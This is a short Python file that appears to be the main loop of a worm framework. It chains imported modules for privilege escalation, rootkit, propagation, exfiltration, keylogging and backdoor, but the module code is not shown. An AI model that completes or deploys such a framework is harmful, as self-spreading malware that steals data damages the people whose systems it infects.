from modules import privesc
from modules import rootkit
from modules import propagation
from modules import exfiltration
from modules import keylogger
from modules import backdoor
from modules import instructions


def main():
    print("Worm just landed!")

    # map modules to function
    modules = {
        "privesc": privesc.run,
        "rootkit": rootkit.run,
        "propagation": propagation.run,
        "exfiltration": exfiltration.run,
        "keylogger": keylogger.run,
        "backdoor": backdoor.run,
        "instructions": instructions.run,
    }

    # first step
    next_step = "privesc"
    result = None

    while next_step != "clean":
        # execute module and get result and next step
        result, next_step = modules[next_step]()
        if result:
            # launch network propagation?
            pass
        else:
            print(f"Module {next_step} faild :(")
            break


if __name__ == "__main__":
    main()
